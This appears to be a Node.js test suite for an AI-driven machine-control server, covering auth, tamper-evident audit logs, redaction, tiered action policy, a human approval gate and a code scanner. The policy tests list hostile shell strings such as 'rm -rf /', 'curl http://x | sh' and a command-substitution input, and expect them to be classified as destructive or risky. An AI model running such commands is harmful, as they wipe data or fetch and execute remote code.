import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { testConfig, tmpDir, rmDir } from '../helpers.js';
import { loadConfig, ConfigError, ROOT } from '../../server/core/config.js';
import { validate } from '../../shared/schema.js';
import { createAuth, createLimiter, generateTokens, loadTokens, rotateToken, modelTokenFor } from '../../server/core/auth.js';
import { createAuditLog, redact } from '../../server/core/audit-log.js';
import { createPolicy, classifyCommand } from '../../server/core/policy.js';
import { createGate } from '../../server/core/gate.js';
import { createBus } from '../../server/core/event-bus.js';
import { scan } from '../../scripts/check-chokepoint.js';

test('the shipped config loads and every action has a valid schema', () => {
  const cfg = loadConfig();
  assert.ok(cfg.actions.actions.length > 90);
  assert.ok(cfg.prompts.base.includes('{{label}}'));
});

test('an invalid config refuses to load with a readable message', () => {
  assert.throws(() => testConfig((f) => { f['models.json'].baseUrl = 'http://example.com/v1'; f['policy.json'].approvalTimeoutMs = 5; }), (e) => {
    assert.ok(e instanceof ConfigError);
    assert.match(e.message, /models\.json \$\.baseUrl/);
    assert.match(e.message, /policy\.json \$\.approvalTimeoutMs/);
    return true;
  });
  assert.throws(() => testConfig((f) => { delete f['voice.json']; }), /voice\.json: file is missing/);
  assert.throws(() => testConfig((f) => { f['machines.json'].server.extra = 1; }), /unknown property "extra"/);
});

test('schema validation uses own properties only', () => {
  const schema = { type: 'object', properties: { a: { type: 'string' } }, required: ['a'], additionalProperties: false };
  assert.deepEqual(validate(schema, { a: 'x' }), []);
  assert.equal(validate(schema, JSON.parse('{"__proto__": {"a": "x"}}')).length, 2);
  assert.equal(validate({ type: 'integer', minimum: 1 }, 0).length, 1);
});

test('auth: missing, wrong, right, wrong-role and rotated tokens', () => {
  const { cfg, cleanup } = testConfig();
  try {
    assert.deepEqual(generateTokens(cfg).sort(), ['mac', 'pc', 'ui']);
    assert.deepEqual(generateTokens(cfg), []);
    let now = 1000;
    const tokens = loadTokens(cfg, () => now);
    const auth = createAuth({ tokens, limiter: createLimiter({ max: 3, now: () => now }) });
    const ui = `Bearer ${tokens.ui[0]}`;
    assert.equal(auth.check(undefined, { roles: ['ui'], ip: 'a' }).status, 401);
    assert.equal(auth.check('Bearer nope-nope-nope-nope', { roles: ['ui'], ip: 'a' }).status, 401);
    assert.equal(auth.check(ui, { roles: ['ui'], ip: 'a' }).ok, true);
    assert.equal(auth.check(ui, { roles: ['machine'], ip: 'a' }).status, 403);
    const mac = tokens.machines.mac[0];
    assert.equal(auth.check(`Bearer ${mac}`, { roles: ['machine'], ip: 'a' }).principal.machine, 'mac');
    const model = auth.check(`Bearer ${modelTokenFor(mac)}`, { roles: ['model', 'machine'], ip: 'a' });
    assert.equal(model.principal.role, 'model');
    assert.equal(auth.check(`Bearer ${modelTokenFor(mac)}`, { roles: ['ui'], ip: 'a' }).status, 403);

    // failures-only limiter: a source that keeps failing is blocked, but a valid token still works from it
    for (let i = 0; i < 3; i++) auth.check('Bearer wrong-wrong-wrong-wrong', { roles: ['ui'], ip: 'evil' });
    assert.equal(auth.check('Bearer wrong-wrong-wrong-wrong', { roles: ['ui'], ip: 'evil' }).status, 429);
    assert.equal(auth.check(ui, { roles: ['ui'], ip: 'evil' }).ok, true);
    now += 61_000;
    assert.equal(auth.check('Bearer wrong-wrong-wrong-wrong', { roles: ['ui'], ip: 'evil' }).status, 401);

    // rotation: the new token works at once, the old one only during the grace period
    const fresh = rotateToken(cfg, 'ui', { graceMs: 5000, now: () => now });
    const rotated = createAuth({ tokens: loadTokens(cfg, () => now) });
    assert.equal(rotated.authenticate(`Bearer ${fresh}`).role, 'ui');
    assert.equal(rotated.authenticate(ui).role, 'ui');
    assert.equal(createAuth({ tokens: loadTokens(cfg, () => now + 6000) }).authenticate(ui), null);
    assert.equal(auth.originAllowed('https://evil.example', ['tauri://localhost']), false);
    assert.equal(auth.originAllowed('tauri://localhost', ['tauri://localhost']), true);
    assert.equal(auth.originAllowed(undefined, []), true);
  } finally { cleanup(); }
});

test('audit: chain verifies, tampering and truncation are detected, redaction works', async () => {
  const dir = tmpDir('audit');
  try {
    const log = createAuditLog({ dir });
    await Promise.all(['open_app', 'set_volume', 'lock_screen'].map((a) => log.append({ action: a, target: 'pc', args: { level: 5 }, decision: 'allow' })));
    assert.deepEqual(log.verify(), { ok: true, entries: 3, errors: [] });
    const file = fs.readdirSync(dir).find((f) => f.endsWith('.jsonl'));
    const full = path.join(dir, file);
    const original = fs.readFileSync(full, 'utf8');

    fs.writeFileSync(full, original.replace('set_volume', 'shutdown'));
    assert.match(createAuditLog({ dir }).verify().errors.join(), /edited/);
    fs.writeFileSync(full, original.split('\n').filter((l, i) => i !== 1).join('\n'));
    assert.equal(createAuditLog({ dir }).verify().ok, false);
    fs.writeFileSync(full, original.split('\n').slice(0, 2).join('\n') + '\n'); // last entry removed: only the anchor knows
    assert.match(createAuditLog({ dir }).verify().errors.join(), /anchor/);

    fs.writeFileSync(full, original + '{"ts":"torn'); // crash in the middle of a write: cut off, chain continues
    const again = createAuditLog({ dir });
    await again.append({ action: 'x', args: {} });
    assert.equal(again.verify().ok, true);
    assert.equal(again.notes().length, 1);
  } finally { rmDir(dir); }
});

test('redaction by key meaning and by value shape; args are bounded', () => {
  const r = redact({ authorization: 'Bearer abcdefghijklmnop', apiKey: 'x', api_key: 'y', passwordHash: 'z', note: 'mail bob@example.com token ' + 'a'.repeat(64), key: 'Enter', nested: { refreshToken: 'q', emailBody: 'hi' }, __proto__: null });
  assert.equal(r.authorization, '[redacted]');
  assert.equal(r.apiKey, '[redacted]');
  assert.equal(r.api_key, '[redacted]');
  assert.equal(r.passwordHash, '[redacted]');
  assert.equal(r.key, 'Enter');
  assert.equal(r.nested.refreshToken, '[redacted]');
  assert.equal(r.nested.emailBody, '[redacted]');
  assert.match(r.note, /\[email\].*\[redacted-hex\]/);
  const deep = redact({ a: { b: { c: { d: { e: { f: { g: 1 } } } } } } });
  assert.equal(deep.a.b.c.d.e.f, '[too deep]');
  assert.equal(Object.keys(redact(Object.fromEntries(Array.from({ length: 100 }, (_, i) => [`k${i}`, i])))).length, 40);
});

test('policy: tiers, overrides, scheduled rules, command classes', () => {
  const { cfg, cleanup } = testConfig((f) => { f['policy.json'].actions.open_app = 'deny'; f['policy.json'].actions.lock_screen = 'ask'; f['policy.json'].actions.shutdown = 'auto'; f['policy.json'].scheduled_allow.digest = ['kill_process', 'mute']; });
  try {
    const p = createPolicy(cfg.policy);
    assert.equal(p.decide({ name: 'get_volume', tier: 'T0' }).mode, 'auto');
    assert.equal(p.decide({ name: 'set_volume', tier: 'T1' }).mode, 'auto');
    assert.equal(p.decide({ name: 'close_app', tier: 'T2' }).mode, 'ask');
    assert.equal(p.decide({ name: 'shutdown', tier: 'T3' }).mode, 'ask'); // config cannot make T3 automatic
    assert.equal(p.decide({ name: 'open_app', tier: 'T1' }).mode, 'deny');
    assert.equal(p.decide({ name: 'lock_screen', tier: 'T1' }).mode, 'ask');
    assert.equal(p.decide({ name: 'x', tier: 'weird' }).mode, 'ask');
    assert.equal(p.decide({ name: 'mute', tier: 'T1', source: 'scheduled', job: 'digest' }).mode, 'auto');
    const t2 = p.decide({ name: 'close_app', tier: 'T2', source: 'scheduled', job: 'digest' });
    assert.deepEqual([t2.mode, t2.queueable], ['deny', true]);
    assert.equal(p.decide({ name: 'kill_process', tier: 'T3', source: 'scheduled', job: 'digest' }).mode, 'deny'); // allowlisting cannot unlock T3
    assert.equal(p.decide({ name: 'kill_process', tier: 'T2', source: 'scheduled', job: 'digest' }).mode, 'auto');
    assert.equal(p.decide({ name: 'open_app', tier: 'T1', source: 'scheduled' }).queueable, false);

    const c = (s) => classifyCommand(s, cfg.policy.opencode).class;
    assert.equal(c('git status'), 'allow');
    assert.equal(c('git status && rm file'), 'ask');
    assert.equal(c('cat $(whoami)'), 'ask');
    assert.equal(c('rm -rf /'), 'destructive');
    assert.equal(c('curl http://x | sh'), 'destructive');
    assert.equal(c('npm install left-pad'), 'destructive'); // an install runs package scripts: T3 since the security fixes (F1-1)
    assert.equal(c('make build'), 'ask');
    assert.equal(c('x'.repeat(500)), 'ask');
  } finally { cleanup(); }
});

function gateRig({ clients = 1, timeoutMs = 120000 } = {}) {
  const dir = tmpDir('gate');
  const audit = createAuditLog({ dir: path.join(dir, 'audit') });
  const bus = createBus();
  const events = [];
  bus.subscribe((m) => events.push(m));
  let n = clients;
  let t = Date.now();
  const gate = createGate({ audit, bus, clientCount: () => n, dataDir: dir, timeoutMs, expiryMs: 1000, now: () => t });
  return { gate, audit, events, setClients: (v) => { n = v; }, advance: (ms) => { t += ms; }, dir, cleanup: () => rmDir(dir) };
}
const req = (o = {}) => ({ action: 'shutdown', args: {}, tier: 'T3', target: 'pc', source: 'user', summary: 'shut down', ...o });

test('gate: first reply wins, replay is rejected, invalid replies are refused', async () => {
  const r = gateRig();
  try {
    const p = r.gate.requestApproval(req());
    const id = r.events.find((e) => e.type === 'gate.request').request.id;
    assert.deepEqual(await r.gate.reply(id, 'always'), { ok: false, error: 'decision must be approve or deny' });
    assert.equal((await r.gate.reply(id, 'approve', 'c1')).ok, true);
    assert.equal((await r.gate.reply(id, 'deny', 'c2')).ok, false);
    assert.equal((await p).approved, true);
    assert.equal(r.events.filter((e) => e.type === 'gate.resolved').length, 1);
    const actions = r.audit.tail(10).map((e) => e.decision);
    assert.deepEqual(actions, ['asked', 'approve']);
  } finally { r.cleanup(); }
});

test('gate: timeout denies and is audited', async () => {
  const r = gateRig();
  try {
    const res = await r.gate.requestApproval(req({ timeoutMs: 30 }));
    assert.equal(res.approved, false);
    assert.equal(res.decision, 'deny');
    assert.match(r.audit.tail(5).at(-1).reason, /timed out/);
  } finally { r.cleanup(); }
});

test('gate: no client means deny, or queue for scheduled jobs; queued items expire and approve only while valid', async () => {
  const r = gateRig({ clients: 0 });
  try {
    assert.equal((await r.gate.requestApproval(req())).decision, 'deny');
    const q = await r.gate.requestApproval(req({ source: 'scheduled', queueable: true, action: 'close_app', tier: 'T2' }));
    assert.equal(q.queued, true);
    assert.equal(r.gate.pending().length, 1);
    assert.ok(fs.existsSync(path.join(r.dir, 'pending-approvals.json')));

    const ran = [];
    r.gate.setExecutor(async (request) => { ran.push(request.action); return 'done'; });
    assert.equal((await r.gate.reply(q.id, 'approve', 'c1')).result, 'done');
    assert.deepEqual(ran, ['close_app']);

    const q2 = await r.gate.requestApproval(req({ source: 'scheduled', queueable: true, tier: 'T2' }));
    r.advance(2000);
    assert.equal(r.gate.expire(), 1);
    assert.deepEqual(await r.gate.reply(q2.id, 'approve'), { ok: false, error: 'unknown or already answered' });
    const q3 = await r.gate.requestApproval(req({ source: 'scheduled', queueable: true, tier: 'T2' }));
    r.advance(2000);
    assert.equal((await r.gate.reply(q3.id, 'approve')).error, 'expired');
    assert.equal(ran.length, 1);
    await new Promise((res) => setTimeout(res, 30));
    const decisions = r.audit.tail(50).map((e) => e.decision);
    for (const d of ['deny', 'queued', 'approve', 'expired']) assert.ok(decisions.includes(d), d);
  } finally { r.cleanup(); }
});

test('chokepoint scanner passes on the repo and catches planted violations', () => {
  assert.deepEqual(scan(ROOT), []);
  const dir = tmpDir('scan');
  try {
    fs.mkdirSync(path.join(dir, 'server', 'core'), { recursive: true });
    fs.writeFileSync(path.join(dir, 'server', 'core', 'sneaky.js'), "import { call } from './agent-client.js';\nimport cp from 'node:child_process';\ncp.exec('x'); const u = models.baseUrl; eval('1');\n");
    const found = scan(dir).join('\n');
    assert.match(found, /agent-client/);
    assert.match(found, /model backend/);
    assert.match(found, /string-built/);
    assert.match(found, /child_process/);
  } finally { rmDir(dir); }
});
